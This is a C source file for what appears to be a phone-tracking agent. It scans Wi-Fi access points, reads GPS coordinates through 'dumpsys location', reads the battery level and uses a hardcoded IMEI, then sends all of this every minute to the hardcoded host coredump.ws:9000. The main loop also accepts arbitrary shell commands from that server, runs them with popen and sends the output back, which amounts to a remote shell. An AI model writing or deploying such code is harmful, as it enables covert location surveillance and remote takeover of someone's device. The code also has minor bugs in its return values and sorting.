#include <unistd.h>
#include <sys/capability.h>
#include <errno.h>
#include <stdio.h>
#include <ctype.h>
#include <math.h>
#include <string.h>
#include <stdbool.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ether.h>
#include <net/if_arp.h>
#include <net/ethernet.h>
#include <sys/socket.h>
#include <linux/if.h>
#include <linux/wireless.h>
#include <sys/ioctl.h>
#include <memory.h>
#include <assert.h>
#include <stdlib.h>
#include <search.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define ARRAY_SIZE(arr)(sizeof(arr) / sizeof((arr)[0]))

/*Type of headers we know about (basically union iwreq_data) */
#define IW_HEADER_TYPE_NULL 0 /*Not available */
#define IW_HEADER_TYPE_CHAR 2 /*char[IFNAMSIZ] */
#define IW_HEADER_TYPE_UINT 4 /*__u32 */
#define IW_HEADER_TYPE_FREQ 5 /*struct iw_freq */
#define IW_HEADER_TYPE_ADDR 6 /*struct sockaddr */
#define IW_HEADER_TYPE_POINT 8 /*struct iw_point */
#define IW_HEADER_TYPE_PARAM 9 /*struct iw_param */
#define IW_HEADER_TYPE_QUAL 10 /*struct iw_quality */
#define IW_DESCR_FLAG_NONE 0x0000 /*Obvious */
#define IW_DESCR_FLAG_DUMP 0x0001 /*Not part of the dump command */
#define IW_DESCR_FLAG_EVENT 0x0002 /*Generate an event on SET */
#define IW_DESCR_FLAG_RESTRICT 0x0004 /*GET : request is ROOT only */
#define IW_DESCR_FLAG_NOMAX 0x0008 /*GET : no limit on request size */
#define IW_DESCR_FLAG_WAIT 0x0100 /*Wait for driver event */

/*Size (in bytes) of various events */
static const int event_type_size[] = { [IW_HEADER_TYPE_NULL] = IW_EV_LCP_PK_LEN,
[IW_HEADER_TYPE_CHAR] = IW_EV_CHAR_PK_LEN,
[IW_HEADER_TYPE_UINT] = IW_EV_UINT_PK_LEN,
[IW_HEADER_TYPE_FREQ] = IW_EV_FREQ_PK_LEN,
[IW_HEADER_TYPE_ADDR] = IW_EV_ADDR_PK_LEN,
[IW_HEADER_TYPE_POINT] = IW_EV_LCP_PK_LEN + 4,
[IW_HEADER_TYPE_PARAM] = IW_EV_PARAM_PK_LEN,
[IW_HEADER_TYPE_QUAL] = IW_EV_QUAL_PK_LEN
};


struct iw_ioctl_description
{
	__u8 header_type; /*NULL, iw_point or other */
	__u8 token_type; /*Future */
	__u16 token_size; /*Granularity of payload */
	__u16 min_tokens; /*Min acceptable token number */
	__u16 max_tokens; /*Max acceptable token number */
	__u32 flags; /*Special handling of the request */
};


/*
 * Meta-data about all the standard Wireless Extension request we
 * know about.
 */
static const struct iw_ioctl_description standard_ioctl_descr[] = {
	[SIOCSIWCOMMIT	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_NULL,
	},
	[SIOCGIWNAME	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_CHAR,
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWNWID	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
		.flags		= IW_DESCR_FLAG_EVENT,
	},
	[SIOCGIWNWID	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWFREQ	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_FREQ,
		.flags		= IW_DESCR_FLAG_EVENT,
	},
	[SIOCGIWFREQ	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_FREQ,
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWMODE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_UINT,
		.flags		= IW_DESCR_FLAG_EVENT,
	},
	[SIOCGIWMODE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_UINT,
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWSENS	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWSENS	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCSIWRANGE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_NULL,
	},
	[SIOCGIWRANGE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= sizeof(struct iw_range),
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWPRIV	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_NULL,
	},
	[SIOCGIWPRIV	- SIOCIWFIRST] = { /* (handled directly by us) */
		.header_type	= IW_HEADER_TYPE_NULL,
	},
	[SIOCSIWSTATS	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_NULL,
	},
	[SIOCGIWSTATS	- SIOCIWFIRST] = { /* (handled directly by us) */
		.header_type	= IW_HEADER_TYPE_NULL,
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWSPY	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= sizeof(struct sockaddr),
		.max_tokens	= IW_MAX_SPY,
	},
	[SIOCGIWSPY	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= sizeof(struct sockaddr) +
				  sizeof(struct iw_quality),
		.max_tokens	= IW_MAX_SPY,
	},
	[SIOCSIWTHRSPY	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= sizeof(struct iw_thrspy),
		.min_tokens	= 1,
		.max_tokens	= 1,
	},
	[SIOCGIWTHRSPY	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= sizeof(struct iw_thrspy),
		.min_tokens	= 1,
		.max_tokens	= 1,
	},
	[SIOCSIWAP	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_ADDR,
	},
	[SIOCGIWAP	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_ADDR,
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWMLME	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.min_tokens	= sizeof(struct iw_mlme),
		.max_tokens	= sizeof(struct iw_mlme),
	},
	[SIOCGIWAPLIST	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= sizeof(struct sockaddr) +
				  sizeof(struct iw_quality),
		.max_tokens	= IW_MAX_AP,
		.flags		= IW_DESCR_FLAG_NOMAX,
	},
	[SIOCSIWSCAN	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.min_tokens	= 0,
		.max_tokens	= sizeof(struct iw_scan_req),
	},
	[SIOCGIWSCAN	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_SCAN_MAX_DATA,
		.flags		= IW_DESCR_FLAG_NOMAX,
	},
	[SIOCSIWESSID	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_ESSID_MAX_SIZE + 1,
		.flags		= IW_DESCR_FLAG_EVENT,
	},
	[SIOCGIWESSID	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_ESSID_MAX_SIZE + 1,
		.flags		= IW_DESCR_FLAG_DUMP,
	},
	[SIOCSIWNICKN	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_ESSID_MAX_SIZE + 1,
	},
	[SIOCGIWNICKN	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_ESSID_MAX_SIZE + 1,
	},
	[SIOCSIWRATE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWRATE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCSIWRTS	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWRTS	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCSIWFRAG	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWFRAG	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCSIWTXPOW	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWTXPOW	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCSIWRETRY	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWRETRY	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCSIWENCODE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_ENCODING_TOKEN_MAX,
		.flags		= IW_DESCR_FLAG_EVENT | IW_DESCR_FLAG_RESTRICT,
	},
	[SIOCGIWENCODE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_ENCODING_TOKEN_MAX,
		.flags		= IW_DESCR_FLAG_DUMP | IW_DESCR_FLAG_RESTRICT,
	},
	[SIOCSIWPOWER	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWPOWER	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
#ifdef SIOCSIWMODUL
	[SIOCSIWMODUL	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
#endif
#ifdef SIOCGIWMODUL
	[SIOCGIWMODUL	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
#endif
	[SIOCSIWGENIE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_GENERIC_IE_MAX,
	},
	[SIOCGIWGENIE	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_GENERIC_IE_MAX,
	},
	[SIOCSIWAUTH	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCGIWAUTH	- SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_PARAM,
	},
	[SIOCSIWENCODEEXT - SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.min_tokens	= sizeof(struct iw_encode_ext),
		.max_tokens	= sizeof(struct iw_encode_ext) +
				  IW_ENCODING_TOKEN_MAX,
	},
	[SIOCGIWENCODEEXT - SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.min_tokens	= sizeof(struct iw_encode_ext),
		.max_tokens	= sizeof(struct iw_encode_ext) +
				  IW_ENCODING_TOKEN_MAX,
	},
	[SIOCSIWPMKSA - SIOCIWFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.min_tokens	= sizeof(struct iw_pmksa),
		.max_tokens	= sizeof(struct iw_pmksa),
	},
};

static const struct iw_ioctl_description standard_event_descr[] = {
	[IWEVTXDROP - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_ADDR,
	},
	[IWEVQUAL - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_QUAL,
	},
	[IWEVCUSTOM - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_CUSTOM_MAX,
	},
	[IWEVREGISTERED - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_ADDR,
	},
	[IWEVEXPIRED - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_ADDR,
	},
	[IWEVGENIE - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_GENERIC_IE_MAX,
	},
	[IWEVMICHAELMICFAILURE - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= sizeof(struct iw_michaelmicfailure),
	},
	[IWEVASSOCREQIE - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_GENERIC_IE_MAX,
	},
	[IWEVASSOCRESPIE - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= IW_GENERIC_IE_MAX,
	},
	[IWEVPMKIDCAND - IWEVFIRST] = {
		.header_type	= IW_HEADER_TYPE_POINT,
		.token_size	= 1,
		.max_tokens	= sizeof(struct iw_pmkid_cand),
	},
};

struct stream_descr
{
	char *current; /*Current event in stream of events */
	char *value; /*Current value in event */
	char *end; /*End of the stream */
};

enum scan_sort_order
{
	SO_CHAN,
	SO_CHAN_REV,
	SO_SIGNAL,
	SO_OPEN,
	SO_CHAN_SIG,
	SO_OPEN_SIG,
	SO_OPEN_CH_SI
};

struct scan_result
{
	char mac[18];
	uint8_t strength;
};

static int if_get_flags(int skfd, const char *ifname)
{
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(struct ifreq));
	strncpy(ifr.ifr_name, ifname, sizeof(ifr.ifr_name) - 1);

	if (ioctl(skfd, SIOCGIFFLAGS, &ifr) < 0)
	{
		fprintf(stderr, "can not get interface flags for %s\n", ifname);
		return 0;
	}

	return ifr.ifr_flags;
}

/*Return true if @ifname is known to be up */
bool if_is_up(int skfd, const char *ifname)
{
	return if_get_flags(skfd, ifname) &IFF_UP;
}

int if_set_up(int skfd, const char *ifname)
{
	struct ifreq ifr;

	memset(&ifr, 0, sizeof(ifr));
	strncpy(ifr.ifr_name, ifname, sizeof(ifr.ifr_name) - 1);

	ifr.ifr_flags = if_get_flags(skfd, ifname);
	if (ifr.ifr_flags &IFF_UP)
		return 0;

	ifr.ifr_flags |= IFF_UP;
	return ioctl(skfd, SIOCSIFFLAGS, &ifr);
}

void iw_getinf_range(const char *ifname, struct iw_range *range)
{
	struct iwreq iwr;
	int skfd = socket(AF_INET, SOCK_DGRAM, 0);

	if (skfd < 0)
	{
		fprintf(stderr, "iw_getinf_range: can not open socket");
		return;
	}

	memset(range, 0, sizeof(struct iw_range));
	strncpy(iwr.ifr_name, ifname, IFNAMSIZ);

	iwr.u.data.pointer = (caddr_t) range;
	iwr.u.data.length = sizeof(struct iw_range);
	iwr.u.data.flags = 0;
	if (ioctl(skfd, SIOCGIWRANGE, &iwr) < 0)
	{
		fprintf(stderr, "can not get range information\n");
	}

	close(skfd);
}

/*Print a mac-address, include leading zeroes (unlike ether_ntoa(3)) */
static inline char *ether_addr(const struct ether_addr *ea)
{
	static char mac[18]; /*Maximum length of a MAC address: 2 * 6 hex digits, 6 - 1 colons, plus '\0' */
	char *d = mac, *a = ether_ntoa(ea);
	sprintf(mac, "%02x:%02x:%02x:%02x:%02x:%02x", a[0], a[1], a[2], a[3], a[4], a[5]);
	return mac;
}

/*See comments on 'struct iw_freq' in wireless.h */
static inline float freq_to_hz(const struct iw_freq *freq)
{
	return freq->m* pow(10, freq->e);
}

static int iw_extract_event_stream(struct stream_descr *stream, struct iw_event *iwe, int we_version)
{
	const struct iw_ioctl_description *descr = NULL;
	int event_type;
	unsigned int event_len = 1; /*Invalid */
	unsigned cmd_index; /**MUST* be unsigned */
	char *pointer;

	if (stream->current + IW_EV_LCP_PK_LEN > stream->end)
		return 0;

	/*Extract the event header to get the event id.
	 *Note : the event may be unaligned, therefore copy... */
	memcpy((char*) iwe, stream->current, IW_EV_LCP_PK_LEN);

	if (iwe->len <= IW_EV_LCP_PK_LEN)
		return -1;

	/*Get the type and length of that event */
	if (iwe->cmd <= SIOCIWLAST)
	{
		cmd_index = iwe->cmd - SIOCIWFIRST;
		if (cmd_index < ARRAY_SIZE(standard_ioctl_descr))
			descr = standard_ioctl_descr + cmd_index;
	}
	else
	{
		cmd_index = iwe->cmd - IWEVFIRST;
		if (cmd_index < ARRAY_SIZE(standard_event_descr))
			descr = standard_event_descr + cmd_index;
	}

	/*Unknown events -> event_type = 0  =>  IW_EV_LCP_PK_LEN */
	event_type = descr ? descr->header_type : 0;
	event_len = event_type_size[event_type];

	/*Check if we know about this event */
	if (event_len <= IW_EV_LCP_PK_LEN)
	{
		stream->current += iwe->len; /*Skip to next event */
		return 2;
	}

	event_len -= IW_EV_LCP_PK_LEN;

	/*Fixup for earlier version of WE */
	if (we_version <= 18 && event_type == IW_HEADER_TYPE_POINT)
		event_len += IW_EV_POINT_OFF;

	if (stream->value != NULL)
		pointer = stream->value; /*Next value in event */
	else
		pointer = stream->current + IW_EV_LCP_PK_LEN; /*First value in event */

	/*Copy the rest of the event (at least, fixed part) */
	if (pointer + event_len > stream->end)
	{
		stream->current += iwe->len; /*Skip to next event */
		return -2;
	}

	/*Fixup for WE-19 and later: pointer no longer in the stream */
	/*Beware of alignment. Dest has local alignment, not packed */
	if (we_version > 18 && event_type == IW_HEADER_TYPE_POINT)
		memcpy((char*) iwe + IW_EV_LCP_LEN + IW_EV_POINT_OFF, pointer, event_len);
	else
		memcpy((char*) iwe + IW_EV_LCP_LEN, pointer, event_len);

	/*Skip event in the stream */
	pointer += event_len;

	/*Special processing for iw_point events */
	if (event_type == IW_HEADER_TYPE_POINT)
	{
		unsigned int extra_len = iwe->len - (event_len + IW_EV_LCP_PK_LEN);

		if (extra_len > 0)
		{ /*Set pointer on variable part (warning : non aligned) */
			iwe->u.data.pointer = pointer;

			/*Check that we have a descriptor for the command */
			if (descr == NULL)
			{ /*Can't check payload -> unsafe... */
				iwe->u.data.pointer = NULL; /*Discard paylod */
			}
			else
			{
				unsigned int token_len = iwe->u.data.length *descr->token_size;
				/*
				 *Ugly fixup for alignment issues.
				 *If the kernel is 64 bits and userspace 32 bits, we have an extra 4 + 4
				 *bytes. Fixing that in the kernel would break 64 bits userspace.
				 */
				if (token_len != extra_len && extra_len >= 4)
				{
					union iw_align_u16
					{
						__u16 value;
						unsigned char byte[2];
					} alt_dlen;
					unsigned int alt_token_len;

					/*Userspace seems to not always like unaligned access,
					 *so be careful and make sure to align value.
					 *I hope gcc won't play any of its aliasing tricks... */
					alt_dlen.byte[0] = *(pointer);
					alt_dlen.byte[1] = *(pointer + 1);
					alt_token_len = alt_dlen.value *descr->token_size;

					/*Verify that data is consistent if assuming 64 bit alignment... */
					if (alt_token_len + 8 == extra_len)
					{ /*Ok, let's redo everything */
						pointer -= event_len;
						pointer += 4;

						/*Dest has local alignment, not packed */
						memcpy((char*) iwe + IW_EV_LCP_LEN + IW_EV_POINT_OFF, pointer, event_len);
						pointer += event_len + 4;
						token_len = alt_token_len;

						/*We may have no payload */
						if (alt_token_len)
							iwe->u.data.pointer = pointer;
						else
							iwe->u.data.pointer = NULL;
					}
				}

				/*Discard bogus events which advertise more tokens than they carry ... */
				if (token_len > extra_len)
					iwe->u.data.pointer = NULL; /*Discard paylod */

				/*Check that the advertised token size is not going to
				 *produce buffer overflow to our caller... */
				if (iwe->u.data.length > descr->max_tokens &&
					!(descr->flags &IW_DESCR_FLAG_NOMAX))
					iwe->u.data.pointer = NULL; /*Discard payload */

				/*Same for underflows... */
				if (iwe->u.data.length < descr->min_tokens)
					iwe->u.data.pointer = NULL; /*Discard paylod */
			}
		}
		else
		{
			iwe->u.data.pointer = NULL;
		}

		stream->current += iwe->len; /*Go to next event */
	}
	else
	{
		if (stream->value == NULL &&
			((iwe->len - IW_EV_LCP_PK_LEN) % event_len == 4 ||
				(iwe->len == 12 && (event_type == IW_HEADER_TYPE_UINT ||
					event_type == IW_HEADER_TYPE_QUAL))))
		{
			pointer -= event_len;
			pointer += 4;

			memcpy((char*) iwe + IW_EV_LCP_LEN, pointer, event_len);
			pointer += event_len;
		}

		if (pointer + event_len <= stream->current + iwe->len)
		{
			stream->value = pointer;
		}
		else
		{
			stream->value = NULL;
			stream->current += iwe->len;
		}
	}

	return 1;
}

int get_scan_list(struct scan_result *results, int bound, const char *ifname, int duration)
{
	struct iwreq wrq;
	int wait, waited = 0;
	int idx = 0;
	char scan_buf[0xffff];
	struct iw_range range;
	int skfd = socket(AF_INET, SOCK_DGRAM, 0);

	if (skfd < 0)
	{
		fprintf(stdout, "can not open socket");
		return 0;
	}

	iw_getinf_range(ifname, &range);

	if (!if_is_up(skfd, ifname))
	{
		fprintf(stdout, "Interface '%s' is down\n", ifname);
		if (if_set_up(skfd, ifname) < 0)
		{
			fprintf(stdout, "Can not bring up '%s' for scanning: %s\n", ifname, strerror(errno));
			close(skfd);
			return 0;
		}
	}

	errno = 0;
	memset(&wrq, 0, sizeof(wrq));
	strncpy(wrq.ifr_ifrn.ifrn_name, ifname, IFNAMSIZ);
	if (ioctl(skfd, SIOCSIWSCAN, &wrq) < 0)
	{
		close(skfd);
		return;
	}

	for (wait = 1000; ((waited += wait) < duration) && (idx < bound); wait = 500)
	{
		struct timeval tv = { 0, wait *1000};

		while (select(0, NULL, NULL, NULL, &tv) < 0)
			if (errno != EINTR && errno != EAGAIN)
			{
				close(skfd);
				return;
			}

		wrq.u.data.pointer = scan_buf;
		wrq.u.data.length = sizeof(scan_buf);
		wrq.u.data.flags = 0;

		if (ioctl(skfd, SIOCGIWSCAN, &wrq) == 0)
			break;
	}

	if (wrq.u.data.length)
	{
		struct iw_event iwe;
		struct stream_descr stream;
		int f = 0;

		memset(&stream, 0, sizeof(stream));
		stream.current = scan_buf;
		stream.end = scan_buf + wrq.u.data.length;

		while (iw_extract_event_stream(&stream, &iwe, range.we_version_compiled) > 0)
		{
			switch (iwe.cmd)
			{
				case SIOCGIWAP:
					f |= 1;
					char *a = iwe.u.ap_addr.sa_data;
					sprintf(results[idx].mac, "%02x:%02x:%02x:%02x:%02x:%02x", a[0], a[1], a[2], a[3], a[4], a[5]);
					break;
				case SIOCGIWESSID:
					f |= 2;
					//memcpy(new->essid, iwe.u.essid.pointer, iwe.u.essid.length);
					break;
				case SIOCGIWMODE:
					f |= 4;
					break;
				case SIOCGIWFREQ:
					f |= 8;
					break;
				case SIOCGIWENCODE:
					f |= 16;
					break;
				case IWEVQUAL:
					f |= 32;
					results[idx].strength = iwe.u.qual.level;
					break;
				case IWEVGENIE:
					f |= 64;
					break;
			}

			if (f == 127)
			{
				idx++;
				f = 0;
			}
		}
	}

	close(skfd);

	return idx;
}

void sort_results(struct scan_result *in, struct scan_result *sorted, int count)
{
	int current = count - 1;

	for (int n = 0; n <= 255 && current >= 0; n++)
	{
		for (int i = 0; i < count; i++)
		{
			if (n == in[i].strength)
			{
				sorted[current] = in[i];
				current--;
			}
		}
	}
}

void command_output(const char *cmd, char *out, int len)
{
	memset(out, 0, len);

	/*Open the command for reading. */
	FILE * fp = popen(cmd, "r");
	if (fp == NULL)
	{
		fprintf(stderr, "Failed to run command\n");
		return;
	}

	/*Read the output a line at a time - output it. */
	fgets(out, len - 1, fp);
	len = strlen(out);

	if (len && out[len - 1] == '\n')
	{
		out[len - 1] = 0;
	}

	pclose(fp);
}

void last_coords(char *out, int len)
{
	command_output("dumpsys location | grep -o 'Location\\[fused[^]]*]' | grep -o '[0-9\\.]*,[0-9\\.]*' | tail -n 1", out, len);
}

void battery_status(char *out, int len)
{
	command_output("cat /sys/class/power_supply/battery/capacity", out, len);
}

void rem_newline(char * str){
	int count = strlen(str);

	if (count && str[count - 1] == '\n')
	{
		str[count - 1] = 0;
	}

		if (count && str[count - 1] == '\r')
    	{
    		str[count - 1] = 0;
    	}
}

void location_packet(char * output_line, const char * ifname, const char * imei, const int scan_duration){
	struct scan_result results[128] = { 0 }, sorted_results[128] = { 0 };
	char location_line[128] = { 0 };
	char battery_line[128] = { 0 };
	char wifi_line[512] = { 0 };

	last_coords(location_line, 128);
	battery_status(battery_line, 128);

	int count = get_scan_list(results, ARRAY_SIZE(results), ifname, scan_duration);
	sort_results(results, sorted_results, ARRAY_SIZE(results));

	for (int i = 0; i < count && i < 8; i++)
	{
		strcat(wifi_line, sorted_results[i].mac);
		strcat(wifi_line, "|");
	}

	strcat(output_line, "BASIC;");
	strcat(output_line, imei);
	strcat(output_line, ";");

	strcat(output_line, battery_line);
	strcat(output_line, ";");
	strcat(output_line, location_line);
	strcat(output_line, ";");
	strcat(output_line, wifi_line);
	strcat(output_line, ";!");
}

bool send_cmdresult(char * result, int sock){
     char buffer[4096];
     memset(buffer,0,sizeof(buffer));
     sprintf(buffer,"CMDRESULT;%s;!",result);

		   if( send(sock, buffer, strlen(buffer), 0) != strlen(buffer)){
		   return false;
		   }

		   return true;
}

bool run_command(char *cmd, int sock)
{
    char buffer[512];
    memset(buffer, 0, sizeof(buffer));

rem_newline(cmd);
	/*Open the command for reading. */
sprintf(buffer,"--------Running command %s-----------",cmd);
	if(!send_cmdresult(buffer,sock))return false;

	FILE * fp = popen(cmd, "r");
	if (fp == NULL)
	{
        send_cmdresult("   Failed to run command",sock);
        return false;
	}


	/*Read the output a line at a time - output it. */
	while(fgets(buffer, sizeof(buffer) - 1, fp)){
    	rem_newline(buffer);
    	for(int i=0;i<strlen(buffer);i++)if(buffer[i]=='!')buffer[i]='_';

	   if( !    send_cmdresult(buffer,sock)){
	   	pclose(fp);
	   return false;
	   }
	    memset(buffer, 0, sizeof(buffer));
	}


 send_cmdresult("-------------------------------------------",sock);

	pclose(fp);
	return true;
}

int main()
{
	const char *ifname = "wlan0";
	const int scan_duration = 5000;
	char output_line[1024];
	char input_line[1024];
    char * host="coredump.ws";
    char * port="9000";
	const char *imei = "0156913051685555";
	int sent = 0;

	signal(SIGPIPE, SIG_IGN);

	for (;;)
	{

        int sock =-1;
        struct addrinfo hints = {}, *addrs;
        char port_str[16] = {};

        hints.ai_family = AF_INET;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        int err = getaddrinfo(host, port, &hints, &addrs);

        if(err!=0){
            fprintf(stderr, "Failed to lookup host.\n");
        }else{
            sock = socket(addrs->ai_family, addrs->ai_socktype, addrs->ai_protocol);
        }

		if (sock < 0)
		{
			fprintf(stderr, "Failed to create socket.\n");
		}
		else if (connect(sock, addrs->ai_addr, addrs->ai_addrlen) >= 0)
		{
			for (bool first = true; send(sock, output_line, strlen(output_line), 0) == strlen(output_line);)
			{
				memset(output_line, 0, sizeof(output_line));
				location_packet(output_line, ifname, imei, scan_duration);

				if (!first)
				{
					for (int i = 0; i < 180; i++)
					{
						memset(input_line, 0, sizeof(input_line));
						int cnt = recv(sock, input_line, sizeof(input_line) - 1, MSG_PEEK | MSG_DONTWAIT);

						if ((cnt > 0 && strchr(input_line, '\n') != 0) && (	recv(sock, input_line, strlen(input_line), 0) != cnt || !run_command(input_line, sock)))
						{
							break;
						}

						sleep(1);
					}
				}
				else
				{
					first = false;
				}
			}

			close(sock);
		}
		else
		{
			fprintf(stderr, "Failed to connect to server\n");
		}

		freeaddrinfo(addrs);

		sleep(60);
	}

	return 0;
}
